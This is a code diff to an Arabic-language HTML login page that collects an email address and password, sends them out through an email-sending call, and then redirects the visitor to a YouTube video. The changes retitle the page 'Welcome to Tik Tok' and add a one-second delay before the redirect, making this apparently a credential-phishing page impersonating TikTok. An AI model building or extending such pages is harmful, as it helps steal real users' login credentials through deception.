@@ -44,7 +44,7 @@
     </style>
 </head>
 <body>
-    <h1>مرحبًا بك في صفحة تسجيل الدخول</h1>
+    <h1>مرحبا بك في Tik Tok</h1>
     <div class="form-container">
         <form id="loginForm">
             <input type="email" id="email" name="email" placeholder="أدخل بريدك الإلكتروني" required /><br>
@@ -68,8 +68,12 @@
                 email: email,
                 password: password
             }).then(function(response) {
-                console.log("تم إرسال البريد بنجاح: ", response);
-                window.location.href = "https://www.youtube.com/watch?v=L8XbI9aJOXk"; // توجيه المستخدم إلى الفيديو بعد تسجيل الدخول
+                 console.log("تم إرسال البريد بنجاح: ", response);
+    
+    // إضافة وقت تأخير صغير (1 ثانية) قبل الانتقال إلى الفيديو
+    setTimeout(function() {
+        window.location.href = "https://www.youtube.com/watch?v=L8XbI9aJOXk"; 
+    }, 1000); // 1000 ميللي ثانية (1 ثانية)
             }, function(error) {
                 console.error("فشل إرسال البريد: ", error);
                 alert("حدث خطأ أثناء إرسال البيانات: " + error.text); // عرض تفاصيل الخطأ
